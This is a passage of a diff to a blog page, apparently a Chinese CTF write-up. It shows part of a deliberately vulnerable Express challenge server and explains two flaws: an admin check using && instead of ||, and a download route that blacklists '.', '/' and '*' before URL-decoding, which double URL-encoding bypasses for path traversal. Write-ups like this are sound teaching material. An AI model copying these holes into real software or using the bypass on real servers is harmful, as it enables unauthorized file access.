+</span></span><span class="line"><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">try</span> <span class="p">{</span> <span class="nx">res</span><span class="o">.</span><span class="nx">clearCookie</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">);</span> <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">try</span> <span class="p">{</span> <span class="nx">res</span><span class="o">.</span><span class="nx">clearCookie</span><span class="p">(</span><span class="s1">&#39;logged&#39;</span><span class="p">);</span> <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="o">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/upload&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isLogin</span><span class="p">(</span><span class="nx">req</span><span class="p">))</span> <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;upload&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">getUsername</span><span class="p">(</span><span class="nx">req</span><span class="p">),</span> <span class="nx">message</span><span class="o">:</span> <span class="k">null</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="o">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/upload&#39;</span><span class="p">,</span> <span class="nx">upload</span><span class="o">.</span><span class="nx">single</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">),</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isLogin</span><span class="p">(</span><span class="nx">req</span><span class="p">))</span> <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="o">.</span><span class="nx">file</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;upload&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">getUsername</span><span class="p">(</span><span class="nx">req</span><span class="p">),</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;文件上传成功&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;upload&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">getUsername</span><span class="p">(</span><span class="nx">req</span><span class="p">),</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;上传失败&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// multer 已保存文件
+</span></span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">json</span><span class="p">({</span> <span class="nx">code</span><span class="o">:</span> <span class="mi">200</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="o">.</span><span class="nx">json</span><span class="p">({</span> <span class="nx">code</span><span class="o">:</span> <span class="mi">500</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="o">.</span><span class="k">use</span><span class="p">((</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="o">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span><span class="o">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">getUsername</span><span class="p">(</span><span class="nx">req</span><span class="p">),</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;页面不存在&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="o">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">PORT</span><span class="p">,</span> <span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="o">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Server running at http://localhost:${PORT}`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>第一个漏洞在</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/admin&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isLogin</span><span class="p">(</span><span class="nx">req</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">getUsername</span><span class="p">(</span><span class="nx">req</span><span class="p">)</span> <span class="o">!==</span> <span class="s1">&#39;admin&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个代码意思是如果（没登录）且（用户名不是admin），则拒绝访问，应该改成||，第二个漏洞是这</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">filepathRaw</span> <span class="o">=</span> <span class="nb">String</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">filepath</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">// 1. 黑名单检查
+</span></span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kr">const</span> <span class="nx">bc</span> <span class="k">of</span> <span class="p">[</span><span class="s1">&#39;.&#39;</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;*&#39;</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">filepathRaw</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">bc</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;no no no&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">filepath</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 2. URL 解码
+</span></span></span><span class="line"><span class="cl">    <span class="nx">filepath</span> <span class="o">=</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">filepathRaw</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">full</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nx">resolve</span><span class="p">(</span><span class="nx">filepath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">download</span><span class="p">(</span><span class="nx">full</span><span class="p">,</span> <span class="nx">path</span><span class="p">.</span><span class="nx">basename</span><span class="p">(</span><span class="nx">full</span><span class="p">));</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>先waf检测，再url解码，这样等于没waf，直接双url编码即可绕过</p>
+<h2 id="adlogin">adlogin
 </h2>
 </section>
 
@@ -808,6 +1784,32 @@
             
                 
 <article class="">
+    <a href="/p/2022vnctf%E5%A4%8D%E7%8E%B0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2022vnctf复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2025-ciscn%E5%88%9D%E8%B5%9B/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025-ciscn初赛</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
     <a href="/p/2025-%E9%B9%8F%E7%A8%8B%E6%9D%AF/">
         
         
@@ -834,38 +1836,12 @@
             
                 
 <article class="">
-    <a href="/p/cc4/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">cc4</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
     <a href="/p/%E9%9D%A2%E7%BB%8F/">
         
         
 
         <div class="article-details">
             <h2 class="article-title">面经</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/2025isctf/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">2025isctf</h2>
         </div>
     </a>
 </article>
@@ -930,7 +1906,9 @@
     <section class="copyright">
         &copy; 
         
-        2025 luokaihong
+            2025 - 
+        
+        2026 luokaihong
     </section>
     
     <section class="powerby">
